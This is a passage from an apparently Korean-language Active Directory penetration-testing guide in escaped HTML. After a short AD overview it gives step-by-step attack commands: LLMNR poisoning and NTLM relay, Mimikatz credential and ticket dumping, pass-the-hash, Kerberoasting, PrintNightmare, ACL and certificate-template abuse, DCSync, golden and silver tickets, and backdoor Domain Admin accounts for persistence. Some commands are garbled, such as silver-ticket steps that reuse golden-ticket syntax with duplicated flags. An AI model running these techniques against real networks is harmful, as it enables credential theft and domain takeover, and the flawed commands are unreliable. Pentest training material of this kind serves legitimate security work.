도메인 모음입니다. 트리 내의 도메인은 연속적인 네임스페이스를 공유합니다.\u003c/li\u003e\n\u003cli\u003e포리스트: 포리스트는 AD에서 최상위 컨테이너이며 하나 이상의 트리로 구성됩니다. 포리스트 내의 트리는 공통 전역 카탈로그, 디렉터리 스키마 및 구성을 공유합니다.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch1\u003eActive Directory 도메인 서비스 (AD DS)\u003c/h1\u003e\n\u003cp\u003eAD DS는 Active Directory에서 제공하는 핵심 서비스로, 여러 중요 기능을 포함하고 있습니다:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e도메인 서비스: 인증, 권한 부여 및 디렉터리 서비스를 제공합니다.\u003c/li\u003e\n\u003cli\u003e인증서 서비스: 안전한 통신을 위해 디지털 인증서를 발급하고 관리합니다.\u003c/li\u003e\n\u003cli\u003e경량 디렉터리 서비스: 전체 기능이 필요 없는 애플리케이션을 위한 AD DS의 간소화된 버전을 제공합니다.\u003c/li\u003e\n\u003cli\u003e디렉터리 페더레이션 서비스: 조직 경계를 넘어 단일 로그인(SSO) 기능을 제공합니다.\u003c/li\u003e\n\u003cli\u003e권리 관리: 암호화 및 정책 시행을 통해 민감한 데이터를 보호합니다.\u003c/li\u003e\n\u003cli\u003eDNS 서비스: AD와 통합하여 이름 해결 서비스를 제공합니다.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch1\u003eActive Directory 펜테스팅: 방법론과 기술\u003c/h1\u003e\n\u003ch1\u003e자격 증명 또는 세션 없이 수행하는 정찰\u003c/h1\u003e\n\u003cp\u003e본격적인 펜테스팅 활동에 들어가기 전에 수동으로 환경을 이해하는 것이 중요합니다. Nmap과 같은 도구를 사용하여 열린 포트와 서비스를 스캔할 수 있습니다. 또한 NetBIOS 및 DNS 열거를 통해 AD 구조 및 사용 가능한 호스트에 대한 유용한 통찰을 얻을 수 있습니다.\u003c/p\u003e\n\u003ch2\u003e명령어:\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003enmap -sP \u0026#x3C;대상_네트워크_범위\u003e\nnmap -p 88,135,139,389,445,636,3268,3269,3389 -sV -O \u0026#x3C;대상_IP\u003e\nnbtscan \u0026#x3C;대상_네트워크_범위\u003e\nnslookup -\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=SRV _ldap._tcp.dc._msdcs.\u0026#x3C;도메인\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003eNmap\u003c/li\u003e\n\u003cli\u003enbtscan\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch1\u003e사용자 열거\u003c/h1\u003e\n\u003cp\u003eldapsearch 또는 enum4linux와 같은 도구를 사용하여 사용자 열거를 할 수 있습니다. 이 도구들은 LDAP 및 SMB 프로토콜을 활용하여 사용자 및 그룹에 대한 정보를 수집합니다.\u003c/p\u003e\n\u003ch2\u003e명령어:\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003eldapsearch -x -h \u0026#x3C;도메인_컨트롤러_IP\u003e -b \u003cspan class=\"hljs-string\"\u003e\"dc=예제,dc=com\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"(objectclass=user)\"\u003c/span\u003e\nenum4linux -U \u0026#x3C;대상_IP\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003eldapsearch\u003c/li\u003e\n\u003cli\u003eenum4linux\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch1\u003eLLMNR/NBT-NS 독점공격\u003c/h1\u003e\n\u003cp\u003eLLMNR 및 NBT-NS 독려는 인증 요청을 캡처하고 중계하는 기술로 사용됩니다. Responder와 같은 도구를 사용하여 이러한 요청을 수신하고 해시를 캡처할 수 있으며, 이는 후속 공격에 사용될 수 있습니다.\u003c/p\u003e\n\u003ch2\u003e명령어:\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003esudo responder -I \u0026#x3C;네트워크_인터페이스\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003eResponder\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch1\u003eNTLM 릴레이\u003c/h1\u003e\n\u003cp\u003eNTLM 릴레이 공격은 NTLM 해시를 캡처하고 다른 서비스로 릴레이하여 무단 액세스를 얻는 것을 의미합니다. NTLMRelayX는 이러한 공격을 수행하는 데 강력한 도구입니다.\u003c/p\u003e\n\u003ch2\u003e명령어:\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003esudo ntlmrelayx.\u003cspan class=\"hljs-property\"\u003epy\u003c/span\u003e -tf targets.\u003cspan class=\"hljs-property\"\u003etxt\u003c/span\u003e -smb2support\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003eNTLMRelayX\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch1\u003e자격 증명 도용\u003c/h1\u003e\n\u003cp\u003eMimikatz와 같은 도구를 사용하여 메모리에서 평문 암호, 해시, PIN 코드 및 케르버로스 티켓을 추출하여 자격 증명 도용이 가능합니다.\u003c/p\u003e\n\u003ch2\u003e명령어:\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003emimikatz.\u003cspan class=\"hljs-property\"\u003eexe\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"privilege::debug\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"sekurlsa::logonpasswords\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"exit\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003eMimikatz\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch1\u003e자격 증명 또는 세션을 사용하여 Active Directory 나열하기\u003c/h1\u003e\n\u003cp\u003e한 번 자격 증명을 획득하면 BloodHound와 같은 도구를 사용하여 AD 환경을 매핑하고 관련성 및 잠재적인 공격 경로를 식별할 수 있습니다.\u003c/p\u003e\n\u003ch2\u003e명령어:\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003e\u003cspan class=\"hljs-title class_\"\u003eSharpHound\u003c/span\u003e.\u003cspan class=\"hljs-property\"\u003eexe\u003c/span\u003e -c \u003cspan class=\"hljs-title class_\"\u003eAll\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003eBloodHound\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch1\u003eKerberoasting\u003c/h1\u003e\n\u003cp\u003e케로버로스팅은 SPN(서비스 주체 이름)에 대한 서비스 티켓을 요청하고 이를 오프라인으로 깨서 평문 암호를 얻는 방법입니다. 이 기술에는 Rubeus와 같은 도구가 일반적으로 사용됩니다.\u003c/p\u003e\n\u003ch2\u003e명령어:\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003e\u003cspan class=\"hljs-title class_\"\u003eRubeus\u003c/span\u003e.\u003cspan class=\"hljs-property\"\u003eexe\u003c/span\u003e kerberoast\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003eRubeus\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch1\u003e원격 연결 (RDP, SSH, FTP, Win-RM)\u003c/h1\u003e\n\u003cp\u003e원격 연결을 악용하려면 Metasploit이나 Cobalt Strike와 같은 도구를 사용하여 RDP, SSH, FTP 및 Win-RM과 같은 서비스를 통해 접근할 수 있습니다.\u003c/p\u003e\n\u003ch2\u003e명령어:\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003emsfconsole\nuse exploit/windows/rdp/rdp_login\nset \u003cspan class=\"hljs-variable constant_\"\u003eRHOSTS\u003c/span\u003e \u0026#x3C;대상_ip\u003e\nset \u003cspan class=\"hljs-variable constant_\"\u003eUSERNAME\u003c/span\u003e \u0026#x3C;사용자명\u003e\nset \u003cspan class=\"hljs-variable constant_\"\u003ePASSWORD\u003c/span\u003e \u0026#x3C;암호\u003e\nrun\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003eMetasploit\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch1\u003e현재 세션 티켓\u003c/h1\u003e\n\u003cp\u003e현재 세션 티켓을 분석하면, 하이재킹이나 측면 이동에 악용될 수 있는 활성 세션을 식별하는 데 도움이 됩니다.\u003c/p\u003e\n\u003ch2\u003e명령어:\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003eklist 세션\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch1\u003e컴퓨터 공유에서 자격 증명 찾기\u003c/h1\u003e\n\u003cp\u003e공유 폴더를 스캔하여 저장된 자격 증명을 확인하면 일반 텍스트 암호나 민감한 정보가 포함된 스크립트를 발견할 수 있습니다. SharpHound와 같은 도구를 사용하면 이 프로세스를 자동화할 수 있습니다.\u003c/p\u003e\n\u003ch2\u003e명령어:\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003e\u003cspan class=\"hljs-title class_\"\u003eSharpHound\u003c/span\u003e.\u003cspan class=\"hljs-property\"\u003eexe\u003c/span\u003e -c \u003cspan class=\"hljs-title class_\"\u003eShares\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003eSharpHound\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch1\u003e특정 Exploits\u003c/h1\u003e\n\u003ch2\u003eCVE-2021–1675 (PrintNightmare)\u003c/h2\u003e\n\u003cp\u003e프린트 악몽(PrintNightmare)은 프린트 스풀러 서비스의 취약점을 악용하는 악용 프로그램입니다. PrintNightmare과 같은 도구는 이를 이용하여 권한 상승을 얻습니다.\u003c/p\u003e\n\u003ch2\u003e명령어:\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003e\u003cspan class=\"hljs-title class_\"\u003ePrintNightmare\u003c/span\u003e.\u003cspan class=\"hljs-property\"\u003eexe\u003c/span\u003e \u0026#x3C;대상_ip\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003ePrintNightmare\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003eCVE-2021–34527 (프린트 나이트메어)\u003c/h2\u003e\n\u003cp\u003e이것은 프린트 나이트메어 취약점의 다른 변형입니다. 적절한 패치 관리와 중요 서버에서 프린트 스풀러 서비스를 비활성화하면 이 위험을 완화할 수 있습니다.\u003c/p\u003e\n\u003ch2\u003e명령어:\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003e\u003cspan class=\"hljs-title class_\"\u003eStop\u003c/span\u003e-\u003cspan class=\"hljs-title class_\"\u003eService\u003c/span\u003e -\u003cspan class=\"hljs-title class_\"\u003eName\u003c/span\u003e \u003cspan class=\"hljs-title class_\"\u003eSpooler\u003c/span\u003e -\u003cspan class=\"hljs-title class_\"\u003eForce\u003c/span\u003e\n\u003cspan class=\"hljs-title class_\"\u003eSet\u003c/span\u003e-\u003cspan class=\"hljs-title class_\"\u003eService\u003c/span\u003e -\u003cspan class=\"hljs-title class_\"\u003eName\u003c/span\u003e \u003cspan class=\"hljs-title class_\"\u003eSpooler\u003c/span\u003e -\u003cspan class=\"hljs-title class_\"\u003eStartupType\u003c/span\u003e \u003cspan class=\"hljs-title class_\"\u003eDisabled\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch1\u003e핵심 펜테스팅 기법에 대한 단계별 안내서\u003c/h1\u003e\n\u003ch1\u003e특권 자격 증명/세션을 이용한 Active Directory 권한 상승\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003eBloodHound와 같은 도구를 사용하여 취약 경로를 식별합니다.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003e\u003cspan class=\"hljs-title class_\"\u003eSharpHound\u003c/span\u003e.\u003cspan class=\"hljs-property\"\u003eexe\u003c/span\u003e -c \u003cspan class=\"hljs-title class_\"\u003eAll\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e토큰 위조 또는 서비스 남용과 같은 기술을 사용하여 경로를 악용합니다.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003emimikatz.\u003cspan class=\"hljs-property\"\u003eexe\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"privilege::debug\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"token::elevate\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"exit\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"3\"\u003e\n\u003cli\u003e제한된 리소스에 액세스하려고 시도하여 액세스를 확인합니다.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003edir \\\\\u0026#x3C;target_ip\u003e\\c$\nmimikatz.\u003cspan class=\"hljs-property\"\u003eexe\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"privilege::debug\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"sekurlsa::logonpasswords\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"exit\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"3\"\u003e\n\u003cli\u003e해시를 추출하려면 sekurlsa::logonpasswords 명령을 실행하세요.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cul\u003e\n\u003cli\u003e추출된 해시를 안전하게 저장하여 나중에 사용하세요.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch1\u003e패스 더 해시\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003e대상 계정의 NTLM 해시를 획득하세요.\u003c/li\u003e\n\u003cli\u003e해당 해시를 Mimikatz나 Pass-the-Hash Toolkit과 같은 도구와 함께 사용하여 평문 암호 없이 인증하세요.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003emimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user: /domain: /ntlm: /run:cmd.exe\" \"exit\"\u003c/p\u003e\n\u003ch1\u003e해시/키 전달하기\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003eMimikatz와 같은 도구를 사용하여 Kerberos 키를 추출합니다.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003emimikatz.exe \"privilege::debug\" \"sekurlsa::ekeys\" \"exit\"\u003c/p\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e키를 사용하여 Kerberos 티켓을 요청하고 인증하세요.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003emimikatz.\u003cspan class=\"hljs-property\"\u003eexe\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"kerberos::ptt \u0026#x3C;ticket.kirbi\u003e\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch1\u003e티켓 전달\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003eMimikatz를 사용하여 Kerberos 티켓을 추출하세요.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003emimikatz.\u003cspan class=\"hljs-property\"\u003eexe\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"kerberos::list\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"kerberos::ptt \u0026#x3C;ticket.kirbi\u003e\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"exit\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003eMimikatz를 사용하여 현재 세션에 티켓을 삽입합니다.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch1\u003e자격 증명 재사용\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003e다른 서비스 간에 재사용된 자격 증명 식별\u003c/li\u003e\n\u003cli\u003e획득한 자격 증명을 사용하여 다른 서비스에서 인증합니다.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch1\u003eMSSQL 남용 및 신뢰할 수 있는 링크\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003e네트워크 내 MSSQL 서버 식별\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003esqlcmd -L\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e명령 실행 또는 데이터 검색을 위해 신뢰할 수 있는 링크 악용.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003esqlcmd -S \u0026#x3C;대상_서버\u003e -U \u0026#x3C;사용자_이름\u003e -P \u0026#x3C;암호\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch1\u003e제약이 없는 위임\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003e제약이 없는 위임이 설정된 계정을 식별합니다.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003e\u003cspan class=\"hljs-title class_\"\u003eGet\u003c/span\u003e-\u003cspan class=\"hljs-title class_\"\u003eADUser\u003c/span\u003e -\u003cspan class=\"hljs-title class_\"\u003eFilter\u003c/span\u003e {\u003cspan class=\"hljs-title class_\"\u003eTrustedForDelegation\u003c/span\u003e -eq $true} -\u003cspan class=\"hljs-title class_\"\u003eProperties\u003c/span\u003e \u003cspan class=\"hljs-title class_\"\u003eTrustedForDelegation\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e계정을 위장하여 위임을 남용하십시오.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003emimikatz.\u003cspan class=\"hljs-property\"\u003eexe\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"kerberos::golden /domain:\u0026#x3C;도메인\u003e /sid:\u0026#x3C;도메인SID\u003e /target:\u0026#x3C;대상서비스\u003e /rc4:\u0026#x3C;서비스계정해시\u003e /user:\u0026#x3C;대상사용자\u003e /service:\u0026#x3C;서비스명\u003e /target:\u0026#x3C;대상FQDN\u003e\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"exit\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch1\u003e제한된 위임\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003e위임이 허용된 서비스 식별하기.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003e\u003cspan class=\"hljs-title class_\"\u003eGet\u003c/span\u003e-\u003cspan class=\"hljs-title class_\"\u003eADUser\u003c/span\u003e -\u003cspan class=\"hljs-title class_\"\u003eFilter\u003c/span\u003e {msDS-\u003cspan class=\"hljs-title class_\"\u003eAllowedToDelegateTo\u003c/span\u003e -ne $null} -\u003cspan class=\"hljs-title class_\"\u003eProperties\u003c/span\u003e msDS-\u003cspan class=\"hljs-title class_\"\u003eAllowedToDelegateTo\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e서비스 계정을 탈취하여 위임을 악용하십시오.\u003c/p\u003e\n\u003ch1\u003e리소스 기반 제한된 위임\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003e리소스 기반 위임 설정 식별하기.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003e\u003cspan class=\"hljs-title class_\"\u003eGet\u003c/span\u003e-\u003cspan class=\"hljs-title class_\"\u003eADComputer\u003c/span\u003e -\u003cspan class=\"hljs-title class_\"\u003eFilter\u003c/span\u003e {msDS-\u003cspan class=\"hljs-title class_\"\u003eAllowedToActOnBehalfOfOtherIdentity\u003c/span\u003e -ne $null} -\u003cspan class=\"hljs-title class_\"\u003eProperties\u003c/span\u003e msDS-\u003cspan class=\"hljs-title class_\"\u003eAllowedToActOnBehalfOfOtherIdentity\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e권한 상승을 얻기 위해 설정을 악용하세요.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch1\u003eACL 악용\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003eBloodHound와 같은 도구를 사용하여 ACL 열거.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003e\u003cspan class=\"hljs-title class_\"\u003eSharpHound\u003c/span\u003e.\u003cspan class=\"hljs-property\"\u003eexe\u003c/span\u003e -c \u003cspan class=\"hljs-title class_\"\u003eAll\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e추가 권한을 부여하려면 ACL을 수정하세요.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003e\u003cspan class=\"hljs-title class_\"\u003eInvoke\u003c/span\u003e-\u003cspan class=\"hljs-title class_\"\u003eACLpwn\u003c/span\u003e -\u003cspan class=\"hljs-title class_\"\u003eDomain\u003c/span\u003e \u0026#x3C;도메인\u003e -\u003cspan class=\"hljs-title class_\"\u003ePrincipal\u003c/span\u003e \u0026#x3C;사용자\u003e -\u003cspan class=\"hljs-title class_\"\u003eAddFullControl\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch1\u003e프린터 스풀러 서비스 남용\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003e알려진 취약점을 이용하여 프린트 스풀러 서비스를 악용합니다.\u003c/li\u003e\n\u003cli\u003e해당 서비스를 악용하여 권한을 상승시킵니다.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003e\u003cspan class=\"hljs-title class_\"\u003ePrintNightmare\u003c/span\u003e.\u003cspan class=\"hljs-property\"\u003eexe\u003c/span\u003e \u0026#x3C;대상_ip\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch1\u003e타사 세션 남용\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003e활성 타사 세션을 식별합니다.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003eklist 세션\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e불허된 접근 권한을 얻기 위해 세션을 해킹하세요.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch1\u003eLAPS\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003eAD에 저장된 LAPS 비밀번호를 검색하세요.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-ps\"\u003e\u003cspan class=\"hljs-built_in\"\u003eGet-ADComputer\u003c/span\u003e \u003cspan class=\"hljs-literal\"\u003e-Filter\u003c/span\u003e * \u003cspan class=\"hljs-literal\"\u003e-Property\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"ms-MCS-AdmPwd\"\u003c/span\u003e | \u003cspan class=\"hljs-built_in\"\u003eSelect-Object\u003c/span\u003e Name, \u003cspan class=\"hljs-string\"\u003e\"ms-MCS-AdmPwd\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e지역 관리자 계정에 접근하기 위해 비밀번호를 사용하세요.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch1\u003e인증서 도난\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003eAD에 저장된 인증서를 식별하세요.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003ecertutil -store -user \u003cspan class=\"hljs-title class_\"\u003eMy\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003eCertify와 같은 도구를 사용하여 인증서를 추출하세요.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003e\u003cspan class=\"hljs-title class_\"\u003eCertify\u003c/span\u003e.\u003cspan class=\"hljs-property\"\u003eexe\u003c/span\u003e find /\u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e:domain\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch1\u003e인증서 템플릿 남용\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003e자격증 템플릿 나열하기\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003ecertutil -\u003cspan class=\"hljs-title class_\"\u003eTCAInfo\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e설정이 잘못된 템플릿을 남용하여 상위 권한 획득하기\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003e\u003cspan class=\"hljs-title class_\"\u003eCertify\u003c/span\u003e.\u003cspan class=\"hljs-property\"\u003eexe\u003c/span\u003e request /\u003cspan class=\"hljs-attr\"\u003eca\u003c/span\u003e:\u0026#x3C;CA Name\u003e /template:\u0026#x3C;Template Name\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch1\u003e고 권한 계정으로 Post-Exploitation\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003eDCSync와 같은 도구를 사용하여 도메인 자격 증명 덤프하기.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003emimikatz.\u003cspan class=\"hljs-property\"\u003eexe\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"lsadump::dcsync /domain:\u0026#x3C;도메인\u003e /user:\u0026#x3C;사용자\u003e\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"exit\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e새 계정 생성 또는 그룹 멤버쉽 수정을 통해 권한 상승하기.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003enet user \u0026#x3C;username\u003e \u0026#x3C;password\u003e /add\nnet group \u003cspan class=\"hljs-string\"\u003e\"Domain Admins\"\u003c/span\u003e \u0026#x3C;username\u003e /add\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch1\u003e도메인 자격 증명 덤프\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003eMimikatz를 사용하여 DCSync 실행.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003emimikatz.\u003cspan class=\"hljs-property\"\u003eexe\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"lsadump::dcsync /domain:\u0026#x3C;domain\u003e /user:\u0026#x3C;user\u003e\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"exit\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e덤프된 자격 증명은 안전하게 저장하세요.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch1\u003e권한 상승 및 지속성\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003e백도어 계정 생성을 통해 액세스 유지\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003enet user \u0026#x3C;username\u003e \u0026#x3C;password\u003e /add\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e보안 설명자를 수정하여 지속성을 확보합니다.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003e\u003cspan class=\"hljs-title class_\"\u003eSet\u003c/span\u003e-\u003cspan class=\"hljs-variable constant_\"\u003eACL\u003c/span\u003e -경로 \u003cspan class=\"hljs-string\"\u003e\"AD:\u0026#x3C;경로\u003e\"\u003c/span\u003e -\u003cspan class=\"hljs-title class_\"\u003eACLObject\u003c/span\u003e $acl\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch1\u003e실버 티켓\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003e서비스 계정 해시를 사용하여 실버 티켓을 생성합니다.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-js\"\u003emimikatz.\u003cspan class=\"hljs-property\"\u003eexe\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"kerberos::golden /domain:\u0026#x3C;도메인\u003e /sid:\u0026#x3C;도메인_SID\u003e /target:\u0026#x3C;대상_서비스\u003e /rc4:\u0026#x3C;서비스_계정_해시\u003e /user:\u0026#x3C;대상_사용자\u003e /service:\u0026#x3C;서비스_이름\u003e /target:\u0026#x3C;대상_FQDN\u003e\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"exit\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e도메인 컨트롤러와 통신하지 않고 서비스에 인증합니다.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch1\u003e골든 티켓\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003eKRBTGT 계정 해시를 추출합니다.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs 